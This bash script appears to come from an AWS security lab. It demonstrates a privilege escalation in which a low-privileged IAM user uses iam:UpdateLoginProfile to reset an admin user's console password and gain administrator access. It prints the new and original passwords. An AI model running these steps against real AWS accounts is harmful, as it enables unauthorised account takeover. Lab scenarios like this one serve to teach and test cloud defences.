#!/bin/bash

# Demo script for iam:UpdateLoginProfile privilege escalation
# This scenario demonstrates how a user with iam:UpdateLoginProfile permission
# can escalate to administrative privileges by changing the console password
# of an existing admin user.

set -e

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-ulp-to-admin-starting-user"
ADMIN_USER="pl-prod-ulp-to-admin-target-user"

# Generate a new random password for the admin user
RANDOM_SUFFIX=$(openssl rand -hex 4)
NEW_PASSWORD="PathfinderLabs456!${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM UpdateLoginProfile Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}User-Based One-Hop to Admin${NC}\n"

# Step 1: Retrieve credentials from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_updateloginprofile.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_user_name')
ORIGINAL_PASSWORD=$(echo "$MODULE_OUTPUT" | jq -r '.original_password')
CONSOLE_LOGIN_URL=$(echo "$MODULE_OUTPUT" | jq -r '.console_login_url')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Save original password for cleanup
echo "$ORIGINAL_PASSWORD" > /tmp/ulp_original_password.txt

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify admin user has existing login profile
echo -e "${YELLOW}Step 4: Verifying admin user has existing login profile${NC}"
echo "Admin user: $ADMIN_USER_NAME"
echo "Checking for existing console login profile..."

if aws iam get-login-profile --user-name $ADMIN_USER_NAME &> /dev/null; then
    echo -e "${GREEN}✓ Confirmed: Admin user has existing login profile${NC}"
else
    echo -e "${RED}⚠ Admin user doesn't have a login profile${NC}"
    echo -e "${YELLOW}This is unexpected for this scenario.${NC}"
    exit 1
fi
echo ""

# Step 5: Verify admin user has administrator access
echo -e "${YELLOW}Step 5: Checking admin user's permissions${NC}"
echo "Listing policies attached to admin user..."
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $ADMIN_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text)
echo "Attached policies: $ATTACHED_POLICIES"

if [[ $ATTACHED_POLICIES == *"AdministratorAccess"* ]]; then
    echo -e "${GREEN}✓ Confirmed: Admin user has AdministratorAccess policy${NC}"
else
    echo -e "${YELLOW}Note: Admin user might have different admin permissions${NC}"
fi
echo ""

# Step 6: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 6: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 7: Update login profile for admin user
echo -e "${YELLOW}Step 7: Updating login profile via iam:UpdateLoginProfile${NC}"
echo "Changing console password for admin user: $ADMIN_USER_NAME"
echo "New password: $NEW_PASSWORD"

aws iam update-login-profile \
    --user-name $ADMIN_USER_NAME \
    --password "$NEW_PASSWORD" \
    --no-password-reset-required

echo -e "${GREEN}✓ Successfully updated login profile for admin user!${NC}\n"

# Wait for IAM propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
sleep 15
echo ""

# Step 8: Verify we now have the updated password
echo -e "${YELLOW}Step 8: Password has been successfully changed${NC}"
echo "The admin user can now log in with the new password."
echo -e "${GREEN}✓ Confirmed password update!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Used ${YELLOW}iam:UpdateLoginProfile${NC} to change console password for $ADMIN_USER_NAME"
echo -e "Step 2: Gained ${YELLOW}Administrator Access${NC} (console login)"
echo -e "Result: ${GREEN}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (UpdateLoginProfile) → $ADMIN_USER_NAME → Admin"
echo ""
echo -e "${GREEN}Console Login Information:${NC}"
echo -e "  URL: ${YELLOW}$CONSOLE_LOGIN_URL${NC}"
echo -e "  Username: ${YELLOW}$ADMIN_USER_NAME${NC}"
echo -e "  New Password: ${YELLOW}$NEW_PASSWORD${NC}"
echo -e "  Original Password: ${YELLOW}$ORIGINAL_PASSWORD${NC} (saved for cleanup)"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to restore the original password${NC}"
echo ""
